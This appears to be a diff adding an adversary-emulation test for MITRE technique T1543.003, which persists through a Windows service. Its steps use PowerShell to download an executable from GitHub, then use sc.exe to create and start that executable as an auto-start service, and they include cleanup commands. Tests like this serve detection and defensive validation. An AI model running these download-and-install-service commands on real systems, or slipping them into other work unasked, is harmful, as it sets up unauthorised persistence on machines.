@@ -1,0 +1,48 @@
+api_version: "2.0"
+name: Service Installation CMD
+description: |
+    Download an executable from github and start it as a service.
+    Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.
+args:
+    - name: binary_path
+      type: path
+      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
+    - name: service_type
+      type: string
+      default: Own
+    - name: startup_type
+      type: string
+      default: auto
+    - name: service_name
+      type: string
+      default: AtomicTestService_CMD
+uuid: 981e2942-e433-44e9-afc1-8c957a1496b6
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1543: Create or Modify System Process'
+    subtechniques:
+        - 'T1543.003: Windows Service'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Service binary must exist on disk at specified location (#{binary_path})
+      inline: |
+        if (Test-Path "#{binary_path}") {exit 0} else {{New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
+        }}
+      executor: powershell
+    - name: service-installation-cmd
+      inline: |
+        sc.exe create {{.Args.service_name}} binPath= "{{.Args.binary_path}}" start={{.Args.startup_type}}  type={{.Args.service_type}}
+        sc.exe start {{.Args.service_name}}
+      executor: command_prompt
+      cleanup:
+        inline: |
+            sc.exe stop {{.Args.service_name}} >nul 2>&1
+            sc.exe delete {{.Args.service_name}} >nul 2>&1
+        executor: command_prompt
